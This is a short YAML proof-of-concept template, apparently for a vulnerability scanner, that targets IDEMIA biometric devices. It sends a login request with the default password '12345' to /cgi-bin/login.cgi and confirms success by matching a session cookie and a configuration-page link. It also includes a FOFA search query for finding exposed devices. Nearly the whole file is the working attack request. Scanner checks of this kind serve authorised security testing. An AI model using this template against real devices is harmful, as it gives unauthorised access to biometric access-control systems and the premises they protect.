id: poc-yaml-idemia-biometrics-weak-password
info:
  name: IDEMIA BIOMetrics 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: sigma_wide
  fofa: title="IDEMIA"
requests:
- method: POST
  path: /cgi-bin/login.cgi
  data: password=12345
  expression: status_code == 200 && matches(body,"document.cookie =\"session_id=([0-9a-zA-Z]+);")
    && contains(body,"MA5G_general_configurations.htm") && !contains(body,"Invalid
    Password")
variables: {}
transport: http
